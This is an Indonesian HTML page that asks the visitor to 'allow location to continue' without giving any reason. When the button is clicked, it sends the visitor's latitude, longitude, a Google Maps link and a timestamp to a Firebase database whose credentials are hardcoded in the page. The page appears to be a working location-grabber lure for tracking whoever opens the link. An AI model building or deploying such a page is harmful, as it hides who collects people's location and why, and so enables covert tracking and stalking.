<!DOCTYPE html>
<html>
<head>
  <title>Izinkan Lokasi</title>
  <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
  <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
</head>
<body>
  <h2>Harap izinkan akses lokasi Anda untuk melanjutkan.</h2>
  <button onclick="mintaLokasi()">Izinkan Lokasi</button>

  <script>
    // Firebase config
    const firebaseConfig = {
      apiKey: "AIzaSyBeh7zmo47_qvlo35vJjil7Fn31XipkIV0",
      authDomain: "momon-db593.firebaseapp.com",
      databaseURL: "https://momon-db593-default-rtdb.asia-southeast1.firebasedatabase.app",
      projectId: "momon-db593",
      storageBucket: "momon-db593.appspot.com",
      messagingSenderId: "512788788909",
      appId: "1:512788788909:web:920143794faa0aaf413824",
      measurementId: "G-PD0VHY7GRC"
    };

    // Inisialisasi Firebase
    firebase.initializeApp(firebaseConfig);

    function mintaLokasi() {
      if ("geolocation" in navigator) {
        navigator.geolocation.getCurrentPosition((position) => {
          const lat = position.coords.latitude;
          const lon = position.coords.longitude;
          const mapsLink = `https://maps.google.com/?q=${lat},${lon}`;
          const time = new Date().toISOString();

          // Kirim ke Firebase
          firebase.database().ref("lokasi").push({
            latitude: lat,
            longitude: lon,
            mapsLink: mapsLink,
            time: time
          });

          alert("Lokasi berhasil dikirim!");
        }, (err) => {
          alert("Gagal mengambil lokasi: " + err.message);
        });
      } else {
        alert("Browser tidak mendukung geolocation.");
      }
    }
  </script>
</body>
</html>
